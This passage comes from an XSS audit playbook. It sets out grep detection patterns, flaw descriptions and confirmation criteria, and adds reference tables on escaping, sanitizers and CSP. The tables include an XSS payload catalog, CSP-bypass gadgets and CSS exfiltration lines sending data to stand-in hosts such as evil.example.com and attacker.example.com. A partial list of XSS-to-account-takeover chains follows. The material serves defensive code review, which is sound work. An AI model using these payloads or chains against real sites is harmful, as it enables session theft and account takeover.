browser's (mXSS), it runs at the wrong pipeline stage, or decoding happens after it. Server-side
sanitize → client-side `innerHTML` is the classic mXSS setup.

### XSS-09 — Markdown/rich-text sanitizer bypass
**Detect**
```grep
grep -rniE "marked|markdown-?it|commonmark|remark|showdown|kramdown|redcarpet|goldmark|cmark|misaka|python-markdown" .
grep -rniE "allow.?html|html:\s*true|raw.*html|dangerouslyAllow|unsafe|skipSanitize|escape:\s*false" .
grep -rniE "markdown.*innerHTML|to_html.*html_safe|render_markdown.*raw" .
```
**Flow:** markdown engine has raw-HTML passthrough enabled (`html: true`) OR its output is not sanitized
after rendering → `<img onerror>` / raw HTML in markdown reaches the DOM. Also link/image syntax
(`[x](javascript:...)`, `![](x onerror=...)`) if the URL isn't scheme-validated.
**Confirm:** raw-HTML passthrough is on, or no sanitizer follows the renderer, or link URLs aren't
scheme-checked. Non-issue if HTML is disabled AND output is sanitized AND link URLs are scheme-validated.

### XSS-10 — Sanitizer allowlist too broad or dangerous tags/attributes allowed
**Detect**
```grep
grep -rniE "ADD_TAGS|ADD_ATTR|ALLOW_DATA_ATTR|ALLOW_UNKNOWN_PROTOCOLS|WHOLE_DOCUMENT" .
grep -rniE "allowed_?(tags|attributes|elements)|:elements|:attributes|:protocols|AllowedTags|allowElements" .
grep -rniE "\b(style|svg|math|form|input|iframe|base|use|object|embed|foreignObject|animate|set)\b" | grep -iE "allow|add_tags|elements"
grep -rniE "\b(id|name|style|srcdoc|xlink:href|href|action|formaction|data-)\b" | grep -iE "allow|add_attr|attributes"
```
**Flow:** the sanitizer allows a weaponizable tag (`<svg>`,`<math>`,`<form>`,`<style>`,`<base>`,`<use>`,
`<iframe srcdoc>`) or attribute (`id`/`name`→clobbering, `style`→CSS exfil, `data-*`→gadgets,
`xlink:href`→javascript:) → XSS despite "sanitization."
**Confirm:** enumerate the allowlist; any entry above = candidate. Non-issue if the allowlist is limited
to inline formatting tags (`b i em strong a code pre` with URL-validated `href`) and blocks `id`/`name`/
`style`/`data-*`/event/URL-on-SVG attributes.

### XSS-12 — Sanitization performed before later unsafe mutation/concatenation
**Detect**
```grep
grep -rniE "sanitize\(|purify\(|clean\(|scrub" . | head
# then look for the sanitized value being concatenated/wrapped AFTER:
grep -rnE "sanitized?\s*[+.]|\+\s*sanitized|`\$\{.*sanitiz|f\".*\{.*clean|format.*purif" src/ app/
grep -rnE "sanitize\(.*\)\.replace\(|clean\(.*\)\s*\+|decodeURI(Component)?\(.*sanitiz" src/
```
**Flow:** value is sanitized, then subsequently concatenated with other markup, string-replaced, or
decoded → the post-processing re-introduces an executable construct (splices a broken tag back together,
or decodes an entity into `<`) → XSS. Sanitize-then-mutate voids the sanitizer's guarantee.
**Confirm:** any transformation of the sanitized string before it reaches the sink. Non-issue if the
sanitized output goes DIRECTLY to the sink with no further mutation, decode, or concatenation.

### XSS-13 — Double decoding, entity decoding, or canonicalization mismatch
**Detect**
```grep
grep -rniE "unescape\(|decodeURI(Component)?\(|html_entity_decode|HTMLDecode|CGI.unescape|url.unquote|unescapeHTML" .
grep -rniE "decode.*decode|unescape.*unescape|normalize\(|NFKC|NFKD|iconv|toLowerCase\(\)\.replace" .
```
**Flow:** input is decoded twice, or decoded AFTER validation/sanitization, or Unicode-normalized after
a filter → an encoded payload (`%253Cscript%253E`, `&#x3c;`, full-width `＜`) passes the filter in its
encoded form and becomes `<script>` at the sink. Canonicalization mismatch between filter and sink.
**Confirm:** decode/normalize occurs after the sanitize/validate step, on the same value, before a sink.
Non-issue if decoding happens exactly once and BEFORE the single sanitize step, with no post-sanitize
decode/normalize.

### XSS-22 — SVG/MathML/foreignObject sanitizer bypass
**Detect**
```grep
grep -rniE "\b(svg|math|foreignObject|use|mglyph|annotation-xml|desc|title|set|animate)\b" | grep -iE "allow|add_tags|elements|render|innerHTML"
grep -rniE "image/svg|\.svg\b|inline.*svg|svg.*innerHTML|xlink:href|xmlns" .
```
**Flow:** namespace-confusion: `<svg>`/`<math>` switch the browser's parser into foreign-content mode
where `<style>`/`<mglyph>`/`<annotation-xml>` reparse child text as HTML → an `<img onerror>` hidden
inside escapes into HTML context after the sanitizer passed it (classic mXSS). `foreignObject`/`<use
xlink:href>` embed HTML/external SVG.
**Confirm:** SVG/MathML tags are allowed OR SVG is rendered inline via a raw sink, and the sanitizer
parser differs from the browser's. Non-issue if SVG/MathML are stripped, or SVG is served as a
downloaded/isolated-origin file with `nosniff` (see XSS-21/34).

### XSS-30 — Cached sanitized/rendered HTML reused across unsafe context or stale sanitizer version
**Detect**
```grep
grep -rniE "cache|memoize|rendered_html|cached_markdown|html_cache|fragment_cache|redis.*html|store.*rendered" .
grep -rniE "sanitizer.*version|pipeline.*version|cache_key|cache_version|expire.*cache" .
```
**Flow:** rendered/sanitized HTML is cached; the cache was populated by an OLDER sanitizer (before a
bypass was patched) or is reused in a context with weaker CSP than where it was sanitized → stale unsafe
HTML served after the fix, or safe-here/unsafe-there reuse.
**Confirm:** cached HTML has no sanitizer-version component in its cache key, or the same cached blob
renders in multiple CSP contexts. Non-issue if the cache key includes the sanitizer/pipeline version and
the render context is constant.

### XSS-45 — Sanitizer/filter order bug in HTML pipeline
**Detect**
```grep
grep -rniE "pipeline|filter.*chain|before_filter|after_render|steps\s*=|\.pipe\(|middleware.*html" .
grep -rniE "autolink|linkify|highlight|emoji|mention|sanitize" . | grep -iE "order|position|before|after|first|last"
```
**Flow:** a multi-stage HTML pipeline runs a transform (autolink, emoji, syntax-highlight, mention
expansion) AFTER the sanitize stage → the later stage introduces new markup/attributes that were never
sanitized → XSS. Ordering, not the sanitizer itself, is the bug.
**Confirm:** any markup-producing filter runs after the sanitize filter in the chain. Non-issue if
sanitize is the LAST stage (or every post-sanitize stage only emits text/known-safe nodes).

### XSS-47 — Unicode, null-byte, control-character, or browser parser differential bypass
**Detect**
```grep
grep -rniE "\\x00|\\u0000|null.?byte|strip.*control|remove.*\\x|\\x09|\\x0a|\\x0d|zero.?width" .
grep -rniE "toLowerCase|downcase|\.lower\(\)|normalize|NFKC|charAt|codePointAt" . | grep -iE "javascript|script|scheme|protocol|tag"
```
**Flow:** attacker inserts a null byte, tab/newline, zero-width, or homoglyph into a keyword
(`java\tscript:`, `<scr\x00ipt>`, `＜script＞`) so the filter's string match fails but the browser's
lenient parser still executes it → bypass. Parser differential between filter regex and browser.
**Confirm:** the filter relies on exact string/regex matching of tags/schemes without stripping control/
whitespace/zero-width chars or normalizing first. Non-issue if the filter parses HTML properly (DOM-based
sanitizer, not regex) and normalizes/strips control chars before matching.

---

# Family 5 — `javascript:` / `data:` URI & unsafe link generation

User-controlled URLs land in `href`/`src`/`action`/`formaction`/`xlink:href` without scheme validation.
`javascript:alert(1)` executes on click/load; `data:text/html,...` renders an attacker document.

### XSS-05 — URL-context injection in href, src, action, formaction, or redirects
**Detect**
```grep
grep -rniE "href=|src=|action=|formaction=|xlink:href=|poster=|cite=|background=" app/views templates/ components/ \
  | grep -iE "<%=|\{\{|\$\{|params|user|url|link|redirect"
grep -rnE ":href=|:src=|v-bind:href|\[href\]|\[src\]|to=\{|href=\{|location\.(href|assign|replace)|window\.open" src/
grep -rniE "redirect_to\s+params|redirect\(.*request|sendRedirect\(.*param|Redirect\(.*query" .
```
**Flow:** user URL (profile website, redirect target, link field, avatar src) rendered into a URL
attribute or passed to `location.*`/`redirect_to` without scheme validation → `javascript:`/`data:` URI
executes; open-redirect variants leak tokens.
**Confirm:** the value reaches a URL attribute/redirect with no scheme allowlist. Non-issue if the URL is
validated against an `http(s)`-only allowlist (case-insensitive, whitespace/control-stripped, handles
relative-only) before rendering.

### XSS-23 — Linkification/autolink/reference parser creates unsafe HTML or URL
**Detect**
```grep
grep -rniE "autolink|linkify|auto_link|url_regex|make.*link|detect.*url|Rinku|linkifyjs|anchorme" .
grep -rniE "\[.*\]\(.*\)|\!\[.*\]\(|<a href=.*match|link_to.*matched" .
```
**Flow:** an autolinker converts bare URLs / markdown links into `<a href>` but doesn't scheme-validate
the captured URL, or builds the anchor via string concatenation without encoding → `javascript:` link or
attribute breakout injected through otherwise-plain text.
**Confirm:** the linkifier emits `href` from a regex-captured URL without scheme validation/encoding.
Non-issue if generated links are scheme-allowlisted and the anchor is built with an escaping helper.

### XSS-40 — Mentions/references/slash commands/autocomplete produce unsafe HTML
**Detect**
```grep
grep -rniE "@mention|mention|reference|\bref\b|slash.?command|autocomplete|suggestion|tribute" .
grep -rniE "expand.*reference|render.*mention|render_reference|reference_link|user.*link.*name" .
```
**Flow:** a mention/reference expander turns `@name`, `#123` references into HTML using the referenced
object's name/title, rendered raw or into an attribute → stored XSS via a crafted username/label that
the expander doesn't escape. Autocomplete dropdowns re-render the same unescaped data.
**Confirm:** the expansion interpolates a user-controlled name/title into markup without escaping.
Non-issue if the expander escapes the interpolated name and validates any generated URL.

### XSS-46 — User-controlled protocol scheme bypass such as javascript:, data:, vbscript:, encoded variants
**Detect**
```grep
grep -rniE "javascript:|data:|vbscript:|blob:|filesystem:" . | grep -iE "block|reject|allow|scheme|protocol|startsWith|deny"
grep -rniE "startsWith\(.http|scheme ==|protocol ==|URI\(|new URL\(|uri.scheme|\.scheme\b|allowed.?protocols" .
grep -rniE "gsub.*javascript|replace.*javascript|strip.*scheme|sanitize.*url|valid.?url" .
```
**Flow:** URL scheme filter is present but bypassable — case (`JaVaScRiPt:`), whitespace/control
(`java\tscript:`, leading `\n`), HTML entities (`&#106;avascript:`), URL-encoding
(`%6a%61...script:`), or `data:`/`blob:` not covered → the sink executes the payload scheme.
**Confirm:** the scheme check is a naive prefix/substring match, or misses `data:`/`vbscript:`/encoded
forms. Non-issue if URLs are parsed and the parsed scheme is checked against an `http`/`https`/`mailto`
allowlist AFTER decoding and control-char stripping (block `data:` unless explicitly required + typed).

---

# Family 6 — CSP bypass via script gadgets / nonce misuse

CSP is present but defeated: `unsafe-inline`/`unsafe-eval`, predictable/reused nonces, `strict-dynamic`
loading attacker-pointed scripts, allowlisted domains hosting JSONP/AngularJS, missing `base-uri`/
`object-src`, or `report-only`. Script gadgets = existing page JS that acts on injected `data-*`/class.

### XSS-32 — CSP bypass, nonce misuse, unsafe inline script allowance, or missing sandbox
**Detect**
```grep
grep -rniE "Content-Security-Policy|content_security_policy|contentSecurityPolicy|helmet|secure_headers|csp" config/ middleware/ .
grep -rniE "unsafe-inline|unsafe-eval|strict-dynamic|report-only|reportOnly|'self'|nonce" .
grep -rniE "nonce\s*=|SecureRandom|secrets.token|uuid|Math.random|request_id|static.*nonce" . | grep -iE "csp|nonce"
grep -rniE "base-uri|object-src|form-action|frame-ancestors|require-trusted-types" .
```
**Flow:** the CSP that should backstop other bugs is itself weak — `unsafe-inline` (CSP useless for
XSS), `unsafe-eval` (revives `eval`/`Function`), reused/predictable/`Math.random` nonce, `strict-dynamic`
with a DOM-driven script loader (gadget), allowlisted domain with a JSONP/AngularJS endpoint, or missing
`base-uri`/`object-src`. `report-only` provides zero enforcement.
**Confirm:** read the actual policy string(s); flag each weakening directive and each per-request nonce
that isn't cryptographically fresh. Non-issue only for `script-src 'nonce-<CSPRNG-per-request>'
'strict-dynamic'` with no DOM-driven loader, plus `base-uri 'none'`/`'self'`, `object-src 'none'`,
`form-action 'self'`, and enforcement (not report-only) on all HTML responses.

> **Gadget note:** even a strong CSP falls to script gadgets when the sanitizer allows `data-*`/`class`
> and page JS reads them (see Reference C + D). Pair XSS-32 with XSS-10's allowlist review.

---

# Family 7 — postMessage / cross-frame message channels & sandboxed embeds

Cross-window `postMessage` handlers without origin validation, or iframe/sandbox/preview surfaces that
mishandle untrusted embedded content.

### XSS-33 — Iframe/embed/sandbox escape or unsafe preview mode
**Detect**
```grep
grep -rnE "addEventListener\(.*['\"]message['\"]|onmessage\s*=|\.postMessage\(" src/
grep -rnE "event\.origin|e\.origin|\.origin\s*(==|===|!=|match|includes)|allowedOrigins" src/
grep -rnE "<iframe|srcdoc=|sandbox=|allow-scripts|allow-same-origin|frame-ancestors|X-Frame-Options" . 
grep -rniE "preview|render.*untrusted|embed|oembed|proxy.*html" .
```
**Flow:** (a) a `message` handler uses `event.data` in a sink without checking `event.origin` (or checks
with a loose `includes()`), letting any framing page drive it; or (b) a preview/embed renders untrusted
HTML in an iframe with `sandbox="allow-scripts allow-same-origin"` (which negates the sandbox) or via
`srcdoc` built from user input → XSS.
**Confirm:** handler lacks a strict `event.origin` allowlist (exact match, and NOT matching `'null'` for
sandboxed frames), or the embed/preview iframe combines `allow-scripts`+`allow-same-origin` on untrusted
content. Non-issue if origin is strictly allowlisted and the sandbox omits `allow-same-origin` (or omits
`allow-scripts`) for untrusted embeds.

---

# Family 8 — Prototype pollution → XSS  *(cross-cutting; no dedicated ID)*

No canonical XSS-xx is dedicated to prototype pollution, but it MUST be hunted — it manifests through
XSS-14 (DOM sink), XSS-42 (hydration), and XSS-06 (JS context) when polluted `Object.prototype`
properties feed a sink.
```grep
grep -rnE "merge\(|extend\(|deepMerge|deepClone|deepCopy|defaultsDeep|assignIn|_\.merge|mergeWith|Object.assign\(\{\}" src/ lib/
grep -rnE "__proto__|constructor\.prototype|\[['\"]__proto__|prototype\[" src/ | grep -iviE "block|forbid|reject|hasOwnProperty|null.?proto"
grep -rnE "qs\.parse|querystring\.parse|new URLSearchParams|JSON\.parse\(.*(location|hash|search|param)" src/
```
**Flow:** attacker input containing `__proto__`/`constructor.prototype` flows through a recursive
merge/clone or a nested query parser → sets a property on `Object.prototype` → later `el.innerHTML =
config.template || ''` (or a URL/attr default) reads the polluted value → XSS.
**Confirm:** a recursive merge/parse ingests attacker keys without `__proto__`/`constructor` guards AND
some sink reads an `x || default` config it can pollute. Non-issue if merges use null-prototype objects /
`Object.create(null)` / `Map`, reject `__proto__`/`constructor` keys, or freeze `Object.prototype`.

---

# Family 9 — File upload / MIME / SVG inline rendering

Uploaded files served with a renderable Content-Type on a same-origin, inline-disposition response
become HTML/SVG/XHTML documents in the victim's session.

### XSS-21 — File upload, attachment, SVG, HTML, or MIME/content-type inline rendering
**Detect**
```grep
grep -rniE "content_type|Content-Type|mime|media_type|magic|detect.*type" . | grep -iE "upload|file|attachment|blob|avatar"
grep -rniE "send_file|send_data|serveFile|res\.sendFile|StreamingResponse|FileResponse|ServeContent|X-Sendfile" .
grep -rniE "image/svg|text/html|application/xhtml|inline|Content-Disposition" .
grep -rniE "nosniff|X-Content-Type-Options" config/ middleware/ .
```
**Flow:** user uploads an `.svg`/`.html`/`.xhtml` (or a file whose bytes sniff as HTML); the app serves
it same-origin with `Content-Type: image/svg+xml` or `text/html` and `Content-Disposition: inline`, no
`nosniff` → the browser executes the embedded `<script>`/`onload` in the app's origin.
**Confirm:** upload served inline, same-origin, with a renderable/sniffable type and no `nosniff`.
Non-issue if uploads are served from an isolated/sandbox origin, forced to `attachment` disposition,
`X-Content-Type-Options: nosniff` is set, and SVG/HTML types are re-typed to `text/plain`/downloaded.

### XSS-34 — Content sniffing, wrong content type, inline disposition, or download/open rendering issue
**Detect**
```grep
grep -rniE "Content-Disposition|inline|attachment|filename=" . 
grep -rniE "guess.*type|from.*extension|by.?extension|mimetypes\.guess|MimeTypeMap|extname" .
grep -rniE "X-Content-Type-Options|nosniff|sniff" config/ middleware/ .
grep -rniE "text/plain|application/octet-stream|octet-stream" . | grep -iE "download|serve|file"
```
**Flow:** Content-Type derived from an attacker-controlled extension/filename, or missing `nosniff`, lets
the browser MIME-sniff an "image"/"text" upload as HTML and render it inline → XSS. Wrong disposition
(inline instead of attachment) on a user document is the trigger.
**Confirm:** type is chosen from user input or absent, `nosniff` missing, disposition inline. Non-issue
when a trusted type allowlist + `nosniff` + `attachment` disposition are all enforced on user files.

---

# Family 10 — Third-party render-library CVEs

Libraries that render user content (PDF viewers, diagram/markdown/math renderers, WYSIWYG editors, API
docs viewers) carry their own XSS CVEs and unsafe modes.

### XSS-39 — WYSIWYG/editor/preview path differs from final render path
**Detect**
```grep
grep -rniE "wysiwyg|rich.?text|editor|tiptap|prosemirror|ckeditor|tinymce|quill|slate|draft-?js|lexical|trix" .
grep -rniE "preview|render.*preview|previewHtml|livePreview|editor.*html|getHTML\(|clipboard|paste" .
grep -rniE "pdf(js)?|mermaid|katex|mathjax|swagger|redoc|openapi|plantuml|asciidoc|highlight" package.json Gemfile requirements.txt go.mod composer.json pom.xml
```
**Flow:** the editor's live-preview (or a third-party renderer: PDF viewer, diagram/math/markdown engine,
API-docs UI) renders content through a DIFFERENT, weaker sanitizer than the server's final render, or the
library version has a known XSS CVE / unsafe default (raw-HTML mode, `securityLevel: loose`,
`\href`/`javascript:` in math/diagram, srcdoc injection) → XSS in preview or via the vulnerable lib.
**Confirm:** identify each render library + pinned version (manifest/lockfile) and check its CVE history
and security config; confirm preview and final paths share one sanitizer. Non-issue when libraries are
current, configured to their strict/safe mode, sandboxed, and preview reuses the server sanitizer.

---

# Family 11 — DOM clobbering  *(cross-cutting; no dedicated ID)*

No canonical XSS-xx is dedicated to DOM clobbering; it is enabled when a sanitizer allows `id`/`name`
attributes (XSS-10) and page JS reads globals with `||` fallbacks — surfacing through XSS-06/XSS-14.
```grep
grep -rnE "window\.[A-Za-z_]+\s*(\|\||\?\?|=\s*window\.)|document\.[A-Za-z_]+\s*\|\||globalThis\." src/
grep -rnE "getElementById\(|getElementsByName\(|document\.[a-z]+\.[a-z]" src/ | grep -iE "config|url|src|token|default|option"
grep -rniE "id=|name=" | grep -iE "allow|add_attr|attributes|sanitize"   # sanitizer allowing id/name
```
**Flow:** attacker injects a named element (`<a id="config" href="//attacker.example.com">` or
`<form id="config"><input name="url" value="//attacker.example.com">`); code reading `window.config ||
default` or `document.getElementById('x')` gets the clobbered element/value → attacker controls a config/
URL/script-source → XSS or redirect.
**Confirm:** page JS reads a global/`document` property with an `||`/`??` fallback that an injected named
element can clobber, AND the sanitizer permits `id`/`name`. Non-issue if the sanitizer strips `id`/`name`
(`SANITIZE_NAMED_PROPS`/clobber protection) and code uses explicitly-declared variables, not global
lookups.

---

# Family 12 — CSS injection for data exfiltration

Injected `<style>`/`style` with `style-src 'unsafe-inline'` (or no CSP) exfiltrates secrets via attribute
selectors + `background:url()`, `@import`, or `@font-face` callbacks — no JS required.

### XSS-08 — CSS/style-context injection
**Detect**
```grep
grep -rniE "<style|style=|cssText|\.style\.|insertRule|styleSheets|createElement\(.style|innerHTML.*style" . 
grep -rniE "style-src|unsafe-inline" config/ middleware/ .
grep -rniE "\b(style|link)\b" | grep -iE "allow|add_tags|elements|sanitize"   # sanitizer allowing style/link
grep -rniE "background:\s*url|@import|@font-face|expression\(|url\(" app/views templates/ components/
```
**Flow:** user data reaches a `<style>` block, a `style` attribute, or `element.style.cssText`, and CSS
`style-src 'unsafe-inline'` is allowed (or `<style>` survives the sanitizer) → attacker uses attribute
selectors (`input[value^="a"]{background:url(//evil.example.com/a)}`), `@import`, or `@font-face` to
leak CSRF tokens / form values character-by-character to `evil.example.com`.
**Confirm:** user CSS reaches a style sink AND `style-src` permits inline styles (or no CSP). Non-issue if
`<style>`/`style` are stripped by the sanitizer AND `style-src` excludes `'unsafe-inline'` (nonce/hash
only).

---

# Reference A — Phase-1 rendering-architecture map (fill BEFORE hunting)

Complete all 10 sections from the source before assessing any pattern. This is the attack map; every row
where a defense is "No/None" is a candidate.

1. **Template engines in use** — enumerate every server template language (ERB/Haml/Slim, Jinja/Django,
   Twig/Blade, JSP/Thymeleaf, EJS/Handlebars/Pug, Razor, Go `html/template`) and where each renders.
2. **Auto-escape defaults** — for each engine: is auto-escape ON by default? which chars/contexts does
   it cover? what is the raw/unsafe opt-out syntax? (see Reference E table).
3. **Sanitizer libraries + config** — which sanitizer(s), run on input/output/both, server/client/both;
   the exact allowlist (tags, attributes, protocols), `ADD_TAGS`/`ALLOW_DATA_ATTR`/`ALLOW_UNKNOWN_PROTOCOLS`,
   custom hooks. (see Reference E table).
4. **CSP posture** — full policy per response type; `script-src`/`style-src`/`base-uri`/`object-src`/
   `form-action`/`frame-ancestors`; nonce generation (per-request? CSPRNG?); enforce vs report-only;
   which responses lack CSP (APIs often do). (see Reference E table).
5. **DOM-sink inventory** — every `innerHTML`/`outerHTML`/`insertAdjacentHTML`/`document.write`/jQuery
   `.html()`/`eval`/`Function`/string-`setTimeout` and the source feeding each.
6. **Client framework raw-render APIs** — every `v-html`/`[innerHTML]`/`dangerouslySetInnerHTML`/
   `{@html}`/`bypassSecurityTrust*` and the expression bound to it.
7. **Upload / preview surfaces** — file-upload endpoints, serving Content-Type/disposition/`nosniff`,
   serving origin (same vs isolated), and any inline preview/thumbnail renderers (SVG, PDF, markdown).
8. **Message channels** — `postMessage` handlers (+ origin checks), WebSocket message rendering, iframe
   `srcdoc`/`sandbox` usage, cross-window opener relationships.
9. **Third-party render libs** — markdown/diagram/math/PDF/API-docs/WYSIWYG libraries with pinned
   versions (from lockfiles) and security config; cross-check CVE history and unsafe modes.
10. **Cross-format render paths** — for each user field, list EVERY surface it renders on (web view,
    REST, GraphQL, mobile webview, email, live preview, export) and whether each shares one sanitizer
    (drives XSS-50).

**Context inventory table** (build one row per output point):

| # | Source (input) | Sink (file:line) | Context | Auto-escaped? | Sanitized? | CSP protects? |
|---|---|---|---|---|---|---|
| 1 | record.title | show view | HTML body | Yes | No | Yes (nonce) |
| 2 | record.body | show view | HTML body (v-html) | No | Yes (allowlist) | Yes |
| 3 | user.website | profile link | URL (href) | N/A | No! | No! ← candidate |

---

# Reference B — Payload variation catalog (target context per shape)

| # | Variation | Payload | Target context |
|---|---|---|---|
| a | Plan payload | *(the context-specific payload from the finding)* | as identified |
| b | Basic tag | `<img src=x onerror=alert(1)>` | HTML body |
| c | SVG onload | `<svg onload=alert(1)>` | HTML body / SVG |
| d | Event handler | `<details open ontoggle=alert(1)>` | HTML body (no img) |
| e | JavaScript URI | `javascript:alert(1)` | href / src / action |
| f | Entity encoding | `&#60;img src=x onerror=alert(1)&#62;` | double-decode / XSS-13 |
| g | Case variation | `<IMG SRC=x ONERROR=alert(1)>` | naive regex filters |
| h | Unquoted breakout | `x onmouseover=alert(1) ` | unquoted attribute |
| i | Template literal | `${alert(1)}` | JS template literal |
| j | Attribute breakout | `" onfocus=alert(1) autofocus="` | quoted attribute |
| k | Script-tag close | `</script><script>alert(1)</script>` | JSON/JS in `<script>` |
| l | CSS exfil | `<style>@import url(//evil.example.com/x)</style>` | CSS injection |
| m | Base tag | `<base href=//attacker.example.com>` | missing base-uri |
| n | Form injection | `<form action=//attacker.example.com><input type=submit>` | phishing/exfil |
| o | DOM clobber | `<a id=defaultConfig href=//attacker.example.com>` | global-fallback JS |
| p | mXSS | `<math><mi><table><mglyph><style><img src=x onerror=alert(1)>` | server sanitize→innerHTML |
| q | Data-attr gadget | `<div data-remote=true data-url=//attacker.example.com data-method=post>` | script gadgets |
| r | Markdown | `[x](javascript:alert(1))` · `![](x" onerror="alert(1))` | markdown link/image |
| s | Unicode/ctrl bypass | `java\x09script:alert(1)` · `<img src=x onerror=alert(1)>` | filter differential |
| t | Double encoding | `%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E` | decode-after-filter |

---

# Reference C — CSP-bypass gadget catalog

| # | Technique | When it works |
|---|---|---|
| 1 | **Script gadgets** (`data-*`/class) | Sanitizer allows `data-*`/`class` and page JS reads them into an action/sink (Reference D) |
| 2 | **Base-tag injection** | `base-uri` missing → `<base href=//attacker.example.com>` re-homes all relative script/link URLs |
| 3 | **CSS exfiltration** | `style-src 'unsafe-inline'` → attribute-selector + `background:url()` leaks secrets (XSS-08/12) |
| 4 | **Form-action override** | `form-action` missing/`https:` → `<form action=//attacker.example.com>` exfiltrates on submit |
| 5 | **JSONP on allowlisted domain** | `script-src` allows a domain that hosts a JSONP endpoint → `?callback=payload` |
| 6 | **strict-dynamic script reuse** | A nonce'd script loads a script from DOM-controlled `src` → inject `<div data-src=//attacker.example.com/x.js>` |
| 7 | **Dangling markup / unterminated attribute** | No/loose CSP + partial injection → unclosed `src="//attacker.example.com/?` slurps following markup |
| 8 | **`object-src` gap** | `object-src` missing → `<object data="data:text/html,...">`/`<embed>` executes |
| 9 | **Nonce reuse / predictable nonce** | Static or `Math.random`/request-id nonce → attacker reuses it on an injected inline `<script nonce=...>` |
| + | **Framework expression** | AngularJS on page → `{{constructor.constructor('alert(1)')()}}`; `unsafe-eval` revives `eval`/`Function` |

---

# Reference D — Script-gadget inventory (existing page JS weaponized via injected markup)

- **Data-attribute processors** — behavior driven by `data-*`: remote/AJAX helpers
  (`data-remote`/`data-method`/`data-url`), tooltip/popover `data-html`/`data-content`,
  reactive attribute frameworks (`x-data`/`x-on`/`x-bind`, `hx-get`/`hx-post`/`hx-trigger`,
  `data-controller`/`data-action`). Inject the attribute → existing JS performs the attacker's action.
- **Class-based processors** — JS that queries a CSS class and attaches behavior (e.g. `.js-auto-submit`
  reading `data-endpoint`). Inject the class + data → the handler fires.
- **ID / selector processors + DOM clobbering** — `getElementById`/`querySelector` on fixed IDs, and
  `window.x || default` globals clobbered by injected `id`/`name` elements (Family 11).
- **Event delegation** — parent-level listeners filtered by selector; an injected element matching the
  selector triggers the handler.
- **Framework template gadgets** — client-side template/expression evaluators (AngularJS interpolation,
  Vue mustache in `v-html` output, `eval`-based config, `new Function` from DOM) that execute injected
  expressions even under CSP.

For each: if the sanitizer allows `data-*`/`class`/`id`/`name`, every reader of those attributes is a
gadget. Cross-reference XSS-10 (allowlist) and XSS-32 (CSP).

---

# Reference E — Reference tables

### E1 — Template-engine auto-escaping behavior

| Engine | Auto-escape default | Raw/unsafe syntax | Escapes JS context? | Escapes URL context? |
|---|---|---|---|---|
| ERB (Rails) | Yes | `<%== %>`, `raw()`, `.html_safe` | No | No |
| Haml / Slim | Yes | Haml `!=` / `~`, Slim `==` | No | No |
| Jinja2 | Yes (if configured) | `\|safe`, `{% autoescape false %}`, `Markup()` | No | No |
| Django templates | Yes | `\|safe`, `mark_safe()`, `{% autoescape off %}` | No | No |
| EJS | No (`<%= %>` escapes) | `<%- %>` | No | No |
| Handlebars | Yes (`{{ }}`) | `{{{ }}}` | No | No |
| Pug/Jade | Yes (`#{}`) | `!{}` | No | No |
| Blade (Laravel) | Yes (`{{ }}`) | `{!! !!}` | No | No |
| Twig | Yes | `\| raw`, `{% autoescape false %}` | No | No |
| Thymeleaf | Yes (`th:text`) | `th:utext` | No | No |
| Razor (.NET) | Yes (`@`) | `@Html.Raw()` | No | No |
| Vue | Yes (`{{ }}`) | `v-html` | No | No |
| React/JSX | Yes (`{}` children) | `dangerouslySetInnerHTML` | N/A | No (props not scheme-checked) |
| Angular | Yes (`{{ }}`, `[innerHTML]` sanitizes) | `bypassSecurityTrustHtml()` | No | No |
| Svelte | Yes (`{}`) | `{@html}` | No | No |
| Go `html/template` | Yes (context-aware) | `template.HTML/JS/URL()` | Yes (with `template.JS`) | Yes (with `template.URL`) |

> **Key rule:** except Go's context-aware `html/template`, **NO engine auto-escapes for JS or URL
> contexts.** Any user data inside `<script>` or `href`/`src` needs manual context-specific escaping.

### E2 — Sanitizer libraries + safe config

| Library | Lang | Safe default? | Key config to verify |
|---|---|---|---|
| DOMPurify | JS | Yes | `FORBID_TAGS`/`FORBID_ATTR`; `ALLOW_DATA_ATTR:false`; `ALLOW_UNKNOWN_PROTOCOLS:false`; avoid `ADD_TAGS: [svg,math,style,form]`; `SANITIZE_NAMED_PROPS` for clobbering |
| Sanitize (gem) | Ruby | Yes (restricted) | `:elements`, `:attributes`, `:protocols` — keep tight; beware custom relaxed configs |
| Rails `sanitize` | Ruby | Moderate | `sanitized_allowed_tags`/`_attributes`; custom scrubbers; audit `sanitize` allowlist overrides |
| Bleach | Python | Yes | `tags`, `attributes`, `protocols`, `strip`; do not add `style`/`svg` |
| HtmlSanitizer | .NET | Yes | `AllowedTags`/`AllowedAttributes`/`AllowedCssProperties`/`AllowedSchemes` |
| OWASP Java HTML Sanitizer | Java | Yes | `PolicyFactory`, `allowElements()`/`allowAttributes()`/`allowUrlProtocols()` |
| bluemonday | Go | Yes | `p.AllowElements()`/`AllowAttrs()`/`AllowURLSchemes()`; prefer `UGCPolicy()` |

> Verify **stage** (input vs output vs both), **side** (server vs client vs both — server-only + client
> `innerHTML` = mXSS risk), and whether `data-*`/`id`/`name`/`style`/`svg`/`math`/`form` slip through.

### E3 — CSP directive quick reference

| Directive | Blocks | Does NOT block |
|---|---|---|
| `script-src 'nonce-X'` | Inline scripts without the nonce | Scripts loaded by nonce'd scripts (`strict-dynamic`) |
| `script-src 'self'` | External-origin scripts | Same-origin scripts (incl. user uploads!) |
| `script-src 'strict-dynamic'` | Inline + host-allowlisted scripts | Scripts dynamically added by trusted scripts (loader gadget) |
| `script-src 'unsafe-inline'` | Nothing — CSP is useless for XSS | Everything |
| `script-src 'unsafe-eval'` | Nothing for eval | `eval`/`Function`/string `setTimeout` |
| `style-src 'unsafe-inline'` | Nothing for styles | CSS injection / data exfiltration |
| Missing `base-uri` | Nothing | `<base href=//attacker.example.com>` |
| Missing `object-src` | Nothing | `<object>`/`<embed>` with `data:` |
| Missing `form-action` | Nothing | `<form action=//attacker.example.com>` |
| `report-only` | Nothing (logs only) | Everything |
| `require-trusted-types-for 'script'` | Untyped DOM sink assignments | Sinks fed a valid Trusted Type |

---

# Reference F — XSS impact chains (escalate "popup" to full impact)

1. **Stored XSS → read CSRF token → create API token → persistent ATO.** Read `meta[name=csrf-token]`
   → `POST /api/tokens` with the token → attacker holds a durable API credential.
2. **Stored XSS → change email → password reset → full ATO.** `PUT /user/email {email:
   attacker@example.com}` with CSRF → trigger reset → account takeover.
3. **Stored XSS → read private data → exfiltrate via image.** Read `document.body.innerHTML` →
